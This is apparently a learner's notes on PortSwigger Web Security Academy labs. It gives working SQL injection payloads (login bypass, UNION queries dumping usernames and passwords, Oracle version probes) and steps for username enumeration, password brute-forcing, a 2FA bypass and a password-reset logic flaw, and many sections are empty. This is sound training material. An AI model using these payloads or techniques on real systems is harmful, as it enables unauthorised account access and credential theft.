# PortSwigger Academy

PortSwigger Academy (https://portswigger.net/web-security/dashboard) is a collection of training materials (reading & videos) combined with hands-on-labs designed to help you learn how to "secure the web one step at a time". It covers a number of the most common vulnerabilities, helping you understand them, understand how to exploit them, and how they can be prevented. Best of all, they are all free. The tools *are* designed to work with/be supported by PortSwigger's flagship product, Burp Suite Professional, but you can utilize any number of other tools (curl/browsers/ZAP/etc). At the time I worked through these, I did not have access to a professional license, so I used the Burp Suite Community edition (free). Below are my notes written as I worked through the various challenges. 

## SQL Injection

### Vulnerability in WHERE clause allowing retrieval of hidden data

This is a simple challenge to introduce you to the idea of SQL injection. Given a site such as https://acd01f0d1f5c2eb5c0cc51a2007a0016.web-security-academy.net/ you can view differenct product categories which are controlled by the URL (e.g. `/filter?category=Pets`). A simple SQL injection attack added to the end (`/filter?category=' OR 1=1 --`) solves the challenge by telling the SQL server to return all products with no category set or where 1=1 (which always evaluates to True). Adding the `--` at the end comments out any remainder of the SQL statment in the application code.

### Vulnerability allowing login bypass

This is another simple case wherein you are encouraged to log in at a standard username/password form (https://ac031f731e5b8017c0984a7400ba0058.web-security-academy.net/login). Much like the prior example, however, you can manipulate the query directly by providing a username of `administrator'--` and any value for the password field. This terminates the query that is presumeably something like 
`SELECT * FROM users WHERE username = 'administrator' AND password = 'myPassword'`. It results in the following query: `SELECT * FROM users WHERE username = 'administrator'--' AND password = 'no matter'`

### UNION attack, determining the number of columns returned by the query

What we know:

- vulnerability in product category filter
- should be able to use UNION attack to see data from other tables
- first step is to see number of columns being returned by the query

> Goal: determine number of columns returned by query by adding an additional row contiaining null values

https://acd21fe61eb0074fc0b23b47009700b8.web-security-academy.net/filter?category=Pets

The first approach to determining how many columns is to do the `ORDER BY` trick with increasing numbers until you get an error. We do that and see that it errors on `4`, indicating that three columns are being returned:

```
/filter?category=Pets' ORDER BY 1 --
/filter?category=Pets' ORDER BY 2 --
/filter?category=Pets' ORDER BY 3 --
/filter?category=Pets' ORDER BY 4 -- (error)
```

The second approach (and the one required for solving this lab) is to use the `UNION SELECT NULL` trick with the selected number of NULL columns. Based on the information gained in the first approach, we craft the following query/filter and solve the challenge:

```
/filter?category=Pets' UNION SELECT NULL, NULL, NULL --
```

### UNION attack, finding a column containing text

Given:

- SQL injection vuln in the product category filter
- Should be able to do a union attack to pull data from other tables
- builds on previous lab
- need to identify a column that is compatible with string data

> Goal: perform the SQL Injection UNION attack, return additional row containing value provided: `S3HPlT`.

We walk through the three fields looking for a match:

```
/filter?category=Pets' UNION SELECT 'S3HPlT',NULL,NULL-- (internal server error)
/filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (success!)
/filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (internal server error)
```

And we can see that the second attempt solved the challenge - we now know that the query is returning 3 columns and the second is compatible with string data.

### SQL injection UNION attack, retrieving data from other tables

Building on prior solutions, we wnt to retrieve data from other tables. We are told that there is another table called `users` that has a column named `username` and another called `password`. Note that this is easier than the above as we don't have to shove things into one column (yet).

```
/filter?category=Pets' UNION select username, password from users --
```

yields us information like the following:

```
The Lazy Dog

The Lazy Dog is brought to you by the same people who invented the...

carlos

934rdmfpigx806kxma0m

administrator

734gs039pp7hvz53glwk

wiener

6yfdkdcuexrs36a2nd2a
```

We can then take this information and log in as the administrator account.

### SQL injection UNION attack, retrieving multiple values in a single column

This is very much like the prior scenario, but uses the structure from the prior challenges wherein you have three columns, and only the second is compatible with strings. Therefore, we have to shove both the username and password into the same field. This can be done with a query that looks like the following:


```
// determine how many columns exist
filter?category=Pets' UNION SELECT NULL,NULL --

// confirm which columns support text:
filter?category=Pets' UNION SELECT NULL,'a' -- (column 2)

// grab the username/password and stuff them into the 2nd column
/filter?category=Pets' UNION SELECT NULL,username || '~' || password from users --
```

This yeilds a result like the following:

```
More Than Just Birdsong
Pest Control Umbrella
Babbage Web Spray
administrator~o7188srj54a849wwm2cq
Giant Grasshopper
wiener~8hxtfx4depv2otj53nb9
carlos~z54oyd1moidzjxuz9oxm
```

And we can then log in as the administrator, solving the challenge

### SQL injection attack, querying the database type and version on Oracle

> NOTE: I failed quite a bit on this until I clicked the 'hint' and learned that every select on ORACLE needs a from stmt. 

```
// determine how many columns are being returned (2)
/filter?category=Gifts' ORDER BY 2 --

// confirm that both columns are compatible with strings (using built-in table named `dual`)
/filter?category=Gifts' UNION SELECT 'a','a' from dual --

// now let's start doing something
/filter?category=Gifts' UNION SELECT version FROM v$version --

// query the banner
/filter?category=Gifts' UNION SELECT BANNER,'a' from v$version --
```

And that produces the solution:

```
CORE 11.2.0.2.0 Production
a
NLSRTL Version 11.2.0.2.0 - Production
a
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
a
PL/SQL Release 11.2.0.2.0 - Production
a
TNS for Linux: Version 11.2.0.2.0 - Production
a
```

### SQL injection attack, querying the database type and version on MySQL and Microsoft

Similar to the prior




### SQL injection attack, listing the database contents on Oracle




## Cross-site Scripting

## Cross-site Request Forgery (CSRF)

## Clickjacking

## DOM-based Vulnerabilities

## Cross-Origin Resource Sharing (CORS)

## XML External Entity (XXE) injection

## Server-Side Request Forgery (SSRF)

## HTTP Request Smuggling

## OS Command Injection

## Server-Side Template Injection

## Directory Traversal

## Access Control Vulnerabilities

## Authentication

### Username enumeration via different responses

Goal: Enumerate a valid username, brute-force the user's password, and then access the user's account page.

You are provided a wordlist of candidate usernames as well as a list of candidate passwords.

Here are the steps I took to solve this challenge:

1. Load up Burp and start the embedded browser
1. Connect to the URL provided and visit the `/login` page
1. Attempt to log in with a random username/password
1. View the `POST` request in Burp and send it to the intruder
1. On the Positions tab, I cleared the `§` from the session cookie, leaving just the username and password positions
1. Pasted the values from the list of candidate usernames (100 of them) into the Payload Options (simple list) and started the attack, paying attention to the response payload size.
1. After the list ran through, I sorted by response length and noticed that one of them (username: `agenda`) had a different payload length. Looking at the response text, I noticed that it said _"Incorrect password"_. 
1. Returning to the positions page, I changed the username to a static value of `agenda`
1. I cleared the payload list and pasted in the values from the candidate password list and then ran the attack
1. Watching the response lengths, I again noticed taht one of them (password: `robert`) had a different length. Inspecting the response showed that user had logged in. 
1. With this information, I then returned to the browser, manually logged in with this information, and completed the challenge

### 2FA simple bypass

Given a valid username/password and access to that account's email, as well as a victim username/password, you are asked to bypass the 2FA for the victim's account (you do not have access to their email) and get to their profile page.

Walking through the auth flow with a valid user is pretty straight foward. You log in at `/login` and then are directed to `/login2` to enter the 2FA code. Once you get that from your email, you are redirected to `/my-account`.

The "attack" is as simple as completing the first stage with the victim's credentials and then changing the URL to `/my-account`. This succeeds as there is no session logic to confirm that the 2FA code was entered (only redirection logic).

### Password reset broken logic

Given a valid set of credentials as well as a victim username, you are asked to reset the victim's password and then log in to view the "my account" page.

Using the valid credentials, I pretended to have forgotton my password and requested a password reset link. I then completed that process and reviewed the `POST` request to `/forgot-password`. I noticed the payload had not only the reset token and the new password, but also the username. I sent the request to the repeater, changed the `username` to the victim username and re-submitted it. The request completed, so I went to the browser, logged in with the victim username and my newly-set password and was able to view the account page.

## WebSockets

## Web Cache Poisoning

## Insecure Deserialization

## Information Disclosure

## Business Logic Vulnerabilities

## HTTP Host Header Attacks

## OAuth Authentication

